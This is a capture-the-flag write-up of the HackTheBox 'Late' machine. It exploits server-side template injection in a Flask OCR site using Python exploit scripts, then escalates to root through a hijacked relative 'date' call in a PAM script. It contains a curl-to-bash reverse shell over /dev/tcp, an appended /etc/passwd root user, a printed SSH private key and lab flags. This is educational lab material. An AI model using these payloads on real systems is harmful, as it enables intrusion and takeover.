---
Category:
  - B2R
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [RCE, SSTI, exploit-dev, flask, python-PIL, python-coding, python-pytesseract, privesc/relative-paths-hijacking, Linux]
---
![Late.png](../../zzz_res/attachments/Late.png)

***TABLE OF CONTENTS:***

---

# Resolution summary

>[!summary]
>- Web site enumeration reveled a sub-domain running a **Flask Optical Character Recognition** tool
>- The application turned out to be vulnerable to **SSTI** and it was possible to obtain arbitrary code execution
>- svc_acc was able to **create files inside a $PATH folder**, allowing to exploit a **relative path hijacking** vulnerabilities in a custom script and obtain code execution as root

## Improved skills

- Exploit Server Side Template Injection to execute arbitrary code
- Abuse Relative Path Hijacking vulnerabilities to elevate privileges

## Used tools

- nmap
- gobuster
- convert
- linpeas.sh

---

# Information Gathering

Scanned all TCP ports:

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Late]
└─$ sudo nmap -p- -sS 10.10.11.156 -oN scan/all-tcp-ports.txt
[sudo] password for maoutis:
Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-10 14:58 CEST
Nmap scan report for 10.10.11.156
Host is up (0.038s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 32.64 seconds
```

Enumerated open TCP ports:

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Late]
└─$ sudo nmap -p22,80 -sV -sC -A -oN scan/open-tcp-ports.txt -sT 10.10.11.156
Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-10 15:00 CEST
Nmap scan report for 10.10.11.156
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   34.85 ms 10.10.14.1
2   35.67 ms 10.10.11.156

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds
```

# Enumeration

## Port 80 - HTTP (nginx 1.14.0 (Ubuntu))

Enumerated domain and added them to /etc/hosts:

![Late%20c553cd536c4247798836a43cb083efc0](../../zzz_res/attachments/Late%20c553cd536c4247798836a43cb083efc0.png)

![Late%20c553cd536c4247798836a43cb083efc0](../../zzz_res/attachments/Late%20c553cd536c4247798836a43cb083efc0%201.png)

```bash
echo '10.10.11.156     late.htb images.late.htb' | sudo tee -a /etc/hosts
```

### late.htb

Enumerated web directories and files:

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Late]
└─$ gobuster dir -u http://late.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 25
...
/index.html           (Status: 200) [Size: 9461]
/contact.html         (Status: 200) [Size: 6364]
/.                    (Status: 301) [Size: 194] [--> http://late.htb/./]

┌──(maoutis㉿kali)-[~/CTF/HTB/Late]
└─$ gobuster dir -u http://late.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 25
...
/assets               (Status: 301) [Size: 194] [--> http://late.htb/assets/]
```

### images.late.htb

Browsed the domain:

![Late%20c553cd536c4247798836a43cb083efc0](../../zzz_res/attachments/Late%20c553cd536c4247798836a43cb083efc0%202.png)

Transformed an image into text:

![Late%20c553cd536c4247798836a43cb083efc0](../../zzz_res/attachments/Late%20c553cd536c4247798836a43cb083efc0%203.png)

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit]
└─$ cat results.txt                                                                                             1 ⚙
<p></p>
```

Generated an image containing some text inside:

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit]
└─$ convert -background "#000000" -size 800x480 -fill "#ffffff" -pointsize 72 -gravity center label:'Some Text' output.png
```

![Late%20c553cd536c4247798836a43cb083efc0](../../zzz_res/attachments/Late%20c553cd536c4247798836a43cb083efc0%204.png)

```bash
POST /scanner HTTP/1.1
Host: images.late.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------178752961334934490701098382232
Content-Length: 4346
Origin: http://images.late.htb
Connection: close
Referer: http://images.late.htb/
Upgrade-Insecure-Requests: 1

-----------------------------178752961334934490701098382232
Content-Disposition: form-data; name="file"; filename="output.png"
Content-Type: image/png

<raw_img_bytes>

```

```bash
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 10 May 2022 13:31:14 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 17
Connection: close
Content-Disposition: attachment; filename=results.txt
Last-Modified: Tue, 10 May 2022 13:31:14 GMT
Cache-Control: no-cache
ETag: "1652189474.292456-17-369233444"

<p>Some Text
</p>
```

# Exploitation

## Server Side Template Injection

The application, build using Flask, used templates to generates **results.txt**. A sample code of the implemented logic may be similar to the following one:

```python
from flask import Flask, render_template, request, url_for, Response
import pytesseract
import cv2
from PIL import Image

@app.route('/scanner', methods=['GET', 'POST'])
def upload():
    try:
        imagefile = request.files.get('imagefile', '') 
        img = Image.open(imagefile)
        text = pytesseract.image_to_string(img)
        f = open("sample.txt", "a")
        f.truncate(0)
        f.write(text)
        f.close()
        return render_template('result.html', var=text)
    except:
            return render_template('error.html')
```

```html
#result.txt
<p>{{var}}</p>
```

This thesis can be verified by passing a non destructive payload containing a Flask template and observing the behavior:

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit]
└─$ convert -background "#000000" -size 800x480 -fill "#ffffff" -pointsize 72 -gravity center label:'{{5-2}}' output.png

...

┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit]
└─$ cat results.txt                                                                                             1 ⚙
<p>3
</p>
```

Because **results.txt** contained the value “3” it meant that the server executed the instruction contained inside the generated template. 

An exploit was developed to simplify the exploitation process:

```python
#!/home/maoutis/.pyenv/shims/python
import requests, os
from sys import argv

if len(argv) < 3:
	print("Usage: python3 sendImg.py <url> <cmd>")
	exit()

url 	= argv[1]
cmd 	= argv[2]

# Generating the image
print("Generating the payload...")

fullCmd = """/usr/bin/convert \
-background "#000000" \
-size 800x480 \
-fill "#ffffff" \
-font "/usr/share/fonts-firacode/woff/FiraCode-Light.woff" \
-pointsize 25 \
-gravity center \
label:'{{"""+cmd+"}}' /tmp/exploit.png"
os.system(fullCmd)

# Import the image
f = open("/tmp/exploit.png","rb")

# Multipart / File upload
print(f"Uploading file to {url}")

files = {'file': ("image.jpg", f, 'image/jpg')}
resp = requests.post(url, files=files)

# Output
print("\n\nServer response: ")
print(html.unescape(resp.content.decode()))
```

Enumerated all the available classes in search of one that allows to execute remote code:

```python
#!/home/maoutis/.pyenv/shims/python
import requests, os, html
from sys import argv

if len(argv) < 3:
	print("Usage: python3 sendImg.py <url> <cmd>")
	exit()

url 	= argv[1]
cmd 	= argv[2]

# Generating the image
print("Generating the payload...")

fullCmd = """/usr/bin/convert \
-background "#000000" \
-size 2400x1080 \
-fill "#ffffff" \
-font "/usr/share/fonts-firacode/woff/FiraCode-Light.woff" \
-pointsize 25 \
-gravity center \
label:'{{"""+cmd+"}}' /tmp/exploit.png"
os.system(fullCmd)

# Import the image
f = open("/tmp/exploit.png","rb")

# Multipart / File upload
print(f"Uploading file to {url}")

files = {'file': ("image.jpg", f, 'image/jpg')}
resp = requests.post(url, files=files)

# Output
print("\n\nServer response: ")
#print(html.unescape(resp.content.decode()))

output = html.unescape(resp.content.decode())

i = 0
string = ""

for val in output:
	if val == '<':
		print(f"{i} - {string}")
		i+=1
		string=""
	else:
		string+=val
```

```python
┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit]
└─$ python3 enum.py 'http://images.late.htb/scanner' '"foo".__class__.__base__.__subclasses__()'
Generating the payload...
Uploading file to http://images.late.htb/scanner

Server response:
0 -
1 - p>[
2 - class 'type'>,
3 - class 'weakref'>,
4 - class 'weakcallableproxy'>,
5 - class 'weakproxy'>,
6 - class 'int'>,
...
251 - class 'subprocess.Popen'>, # index 249 because indexes 0 and 1 do not come from python classes
...
```

Executed arbitrary code using the `subprocess.Popen` class:

```python
#!/home/maoutis/.pyenv/shims/python
import requests, os, html
from sys import argv

if len(argv) < 3:
	print("Usage: python3 sendImg.py <url> <cmd>")
	exit()

url 	= argv[1]
cmd 	= argv[2]

# Generating the image
print("Generating the payload...")

fullCmd = """/usr/bin/convert \
-background "#000000" \
-size 1920x1080 \
-fill "#ffffff" \
-font "/usr/share/fonts-firacode/woff/FiraCode-Light.woff" \
-pointsize 20 \
-gravity center \
label:'{{"""+cmd+"}}' /tmp/exploit.png"
os.system(fullCmd)

# Import the image
f = open("/tmp/exploit.png","rb")

# Multipart / File upload
print(f"Uploading file to {url}")

files = {'file': ("image.jpg", f, 'image/jpg')}
resp = requests.post(url, files=files)

# Output
print("\n\nServer response: ")
print(html.unescape(resp.content.decode()))
```

```python
┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit]
└─$ python3 sendImg.py 'http://images.late.htb/scanner' '"foo".__class__.__base__.__subclasses__()[249]("ls",shell=True,stdout=-1).communicate()'
Generating the payload...
Uploading file to http://images.late.htb/scanner

Server response:
<p>(b'main.py\nmisc\n__pycache__\nstatic\ntemplates\nuploads\nwsgi.py\n', None)
</p>

┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit]
└─$ python3 sendImg.py 'http://images.late.htb/scanner' '"foo".__class__.__base__.__subclasses__()[249]("id",shell=True,stdout=-1).communicate()'
Generating the payload...
Uploading file to http://images.late.htb/scanner

Server response:
<p>(b'uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)\n', None)
</p>
```

Reverse shell:

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Late]
└─$ echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/10099 0>&1'" > rev.sh

┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit]
└─$ sudo python3 -m http.server 80                                                                              1 ⚙
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.156 - - [10/May/2022 18:23:10] "GET /rev.sh HTTP/1.1" 200 -
```

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit]
└─$ python3 sendImg.py 'http://images.late.htb/scanner' '"foo".__class__.__base__.__subclasses__()[249]("curl 10.10.14.2/rev.sh|/bin/bash",shell=True,stdout=-1).communicate()'
Generating the payload...
Uploading file to http://images.late.htb/scanner

Server response: 
<html>
<head><title>502 Bad Gateway</title></head>
<body bgcolor="white">
<center><h1>502 Bad Gateway</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
```

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Late/exploit]
└─$ nc -nlvp 10099
listening on [any] 10099 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.156] 36730
bash: cannot set terminal process group (1243): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ id; hostname; cat ~/user.txt
id; hostname; cat ~/user.txt
uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
late
17014663f79056cca573134662ef1a25
```

### Vulnerable code

**main.py**

```bash
import datetime
import os, random
from flask.templating import render_template_string
from werkzeug.utils import secure_filename
import PIL.Image
import pytesseract
from PIL import Image
from flask import Flask, request, render_template, redirect, url_for, session, send_file

app = Flask(__name__)

upload_dir = "/home/svc_acc/app/uploads"
misc_dir = '/home/svc_acc/app/misc'
allowed_extensions =  ["jpg" ,'png']
app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'

@app.route('/')
def home():
    return render_template("index.html", title="Image Reader")

@app.route('/scanner', methods=['GET', 'POST'])
def scan_file():
    scanned_text = ''
    results = ''
    if request.method == 'POST':
        start_time = datetime.datetime.now()
        f = request.files['file']

        if f.filename.split('.')[-1] in allowed_extensions:
            try:
                ID = str(random.randint(1,10000))
                file_name = upload_dir + "/" + secure_filename(f.filename )+ ID
                f.save(file_name)
                pytesseract.pytesseract.tesseract_cmd = r'/usr/bin/tesseract'
                scanned_text = pytesseract.image_to_string(PIL.Image.open(file_name))

                results = """<p>{}</p>""".format(scanned_text)

                r = render_template_string(results)
                path = misc_dir + "/" + ID + '_' + 'results.txt'

                with open(path, 'w') as f:
                    f.write(r)

                return send_file(path, as_attachment=True,attachment_filename='results.txt')

            except Exception as e:
                return ('Error occured while processing the image: ' + str(e))
        else:
            return 'Invalid Extension'
```

# Privilege Escalation

## Local enumeration

- Enumerated local users:
    
    ```bash
    bash-4.4$ cat /etc/passwd | grep sh
    root:x:0:0:root:/root:/bin/bash
    sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
    svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
    ```
    
- Leaked svc_acc ssh private key:
    
    ```bash
    svc_acc@late:~$ cat ~/.ssh/
    authorized_keys  id_rsa           id_rsa.pub
    svc_acc@late:~$ cat ~/.ssh/id_rsa
    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
    HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
    bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
    /mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
    d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
    7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
    fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
    ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
    W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
    uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
    T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
    Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
    WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
    Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
    t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
    0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
    uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
    3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
    GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
    ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
    Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
    kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
    Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
    K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
    kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
    -----END RSA PRIVATE KEY-----
    ```
    
- Enumerated possible exploit with linpeas:
    
    ```bash
    ╔══════════╣ Executing Linux Exploit Suggester                                                                                                                                                                                              
    ╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
    [+] [CVE-2021-4034] PwnKit                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                
       Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt                                                                                                                                                                      
       Exposure: probable                                                                                                                                                                                                                       
       Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro                                                                                                                                                   
       Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main                                                                                                                                                                  
                                                                                                                                                                                                                                                
    [+] [CVE-2021-3156] sudo Baron Samedit                                                                                                                                                                                                      
                                                                                                                                                                                                                                                
       Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt                                                                                                                                      
       Exposure: probable                                                                                                                                                                                                                       
       Tags: mint=19,[ ubuntu=18|20 ], debian=10                                                                                                                                                                                                
       Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main                                                                                                                                                                  
                                                                                                                                                                                                                                                
    [+] [CVE-2021-3156] sudo Baron Samedit 2                                                                                                                                                                                                    
                                                                                                                                                                                                                                                
       Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt                                                                                                                                      
       Exposure: probable                                                                                                                                                                                                                       
       Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10                                                                                                                                                                             
       Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main                                                                                                                                                                 
                                                                                                                                                                                                                                                
    [+] [CVE-2018-18955] subuid_shell                                                                                                                                                                                                           
                                                                                                                                                                                                                                                
       Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712                                                                                                                                                                  
       Exposure: probable                                                                                                                                                                                                                       
       Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}                                                                                                                                                       
       Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip                                                                                                                               
       Comments: CONFIG_USER_NS needs to be enabled                                                                                                                                                                                             
                                                                                                                          
    [+] [CVE-2021-22555] Netfilter heap out-of-bounds write                                                               
                                                                                                                          
       Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html                                                                                                                                               
       Exposure: less probable                                                                                                                                                                                                                  
       Tags: ubuntu=20.04{kernel:5.8.0-*}                                                                                                                                                                                                       
       Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c                                                                                                                      
       ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c                                                                                                                                        
       Comments: ip_tables kernel module must be loaded                                                                                                                                                                                         
                                                                                                                                                                                                                                                
    [+] [CVE-2019-18634] sudo pwfeedback                                                                                                                                                                                                        
                                                                                                                          
       Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/                                                         
       Exposure: less probable                                                                                            
       Tags: mint=19                                                                                                                                                                                                                            
       Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c                                                                                                                                                   
       Comments: sudo configuration requires pwfeedback to be enabled.                                                                                                                                                                          
                                                                                                                                                                                                                                                
    [+] [CVE-2019-15666] XFRM_UAF                                                                                                                                                                                                               
                                                                                                                                                                                                                                                
       Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc                                                                                                                                                                           
       Exposure: less probable                                                                                                                                                                                                                  
       Download URL: 
       Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled
    
    [+] [CVE-2017-5618] setuid screen v4.5.0 LPE
    
    	 Details: https://seclists.org/oss-sec/2017/q1/184
       Exposure: less probable
       Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
    
    [+] [CVE-2017-0358] ntfs-3g-modprobe
    
       Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
       Exposure: less probable
       Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
       Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
       Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
    ```
    
- Enumerated active ports:
    
    ```bash
    ╔══════════╣ Active Ports                                                                                                                                                                                                                   
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                                                                                                                                                           
    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                                                                                           
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                                                                                                           
    tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                                                                                                                                                           
    tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      1231/python3                                                                                                                                                
    tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                                                                                                                                                           
    tcp6       0      0 :::80                   :::*                    LISTEN      -                                                                                                                                                           
    tcp6       0      0 :::22                   :::*                    LISTEN      -
    ```
    

## Relative Path Hijacking / Writable path abuse

Enumerated PATH with linpeas:

```bash
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
New path exported: /home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Enumerated uncommon files:

```bash
╔══════════╣ .sh files in  and directories
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
You own the script: /usr/local/sbin/ssh-alert.sh
/usr/bin/gettext.sh

svc_acc@late:/usr/local$ ls -ald sbin
drwxr-xr-x 2 svc_acc svc_acc 4096 May 10 19:58 sbin

svc_acc@late:/usr/local$ ls -al sbin/
total 12
drwxr-xr-x  2 svc_acc svc_acc 4096 May 10 19:59 .
drwxr-xr-x 10 root    root    4096 Aug  6  2020 ..
-rwxr-xr-x  1 svc_acc svc_acc  433 May 10 19:59 ssh-alert.sh

svc_acc@late:/usr/local$ cat sbin/ssh-alert.sh
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi

svc_acc@late:/usr/local$ grep -ri ssh-alert /etc/ 2>/dev/null
/etc/pam.d/sshd:session required pam_exec.so /usr/local/sbin/ssh-alert.sh
svc_acc@late:/usr/local$ cat /etc/pam.d/sshd | grep -v '#' |grep .
@include common-auth
account    required     pam_nologin.so
@include common-account
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
@include common-session
session    optional     pam_motd.so noupdate
session    required     pam_limits.so
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open
@include common-password
session required pam_exec.so /usr/local/sbin/ssh-alert.sh
```

Tried to update the script but it did not work:

```bash
svc_acc@late:/usr/local/sbin$ echo 'echo $(id) > /tmp/id' > ssh-alert.sh 
-bash: ssh-alert.sh: Operation not permitted
```

Exploited relative path hijacking in `Date: `date``:

```bash
svc_acc@late:/usr/local/sbin$ echo 'echo $(id) > /dev/shm/id.txt' > date
svc_acc@late:~$ exit
logout
Connection to late.htb closed.

┌──(kali㉿kali)-[~/…/HTB/B2R/Late/loot]
└─$ ssh -i svc_acc.key svc_acc@late.htb
svc_acc@late:/usr/local/sbin$ cat /dev/shm/id.txt
uid=0(root) gid=0(root) groups=0(root)
```

Injected a root user and logged in as root:

```bash
svc_acc@late:/usr/local/sbin$ openssl passwd evil		
AK24fcSx2Il3I

svc_acc@late:/usr/local/sbin$ echo 'echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd' > date

svc_acc@late:~$ exit
logout
Connection to late.htb closed.

┌──(kali㉿kali)-[~/…/HTB/B2R/Late/loot]
└─$ ssh -i svc_acc.key svc_acc@late.htb
svc_acc@late:/usr/local/sbin$ su root2
Password:
root@late:/usr/local/sbin# id; hostname; ifconfig; cat /root/root.txt
uid=0(root) gid=0(root) groups=0(root)
late
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.156  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:3340  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:3340  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:33:40  txqueuelen 1000  (Ethernet)
        RX packets 7477  bytes 2958498 (2.9 MB)
        RX errors 0  dropped 35  overruns 0  frame 0
        TX packets 5403  bytes 814488 (814.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8013  bytes 2196360 (2.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8013  bytes 2196360 (2.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

8c0052eaaca4ce0e103928cb82e7e550
```

![Late%20c553cd536c4247798836a43cb083efc0](../../zzz_res/attachments/Late%20c553cd536c4247798836a43cb083efc0%205.png)

# Trophy

![Late%20c553cd536c4247798836a43cb083efc0](../../zzz_res/attachments/Late%20c553cd536c4247798836a43cb083efc0%206.png)

>[!success]
>**User.txt**
>17014663f79056cca573134662ef1a25

>[!success]
>**Root.txt**
>8c0052eaaca4ce0e103928cb82e7e550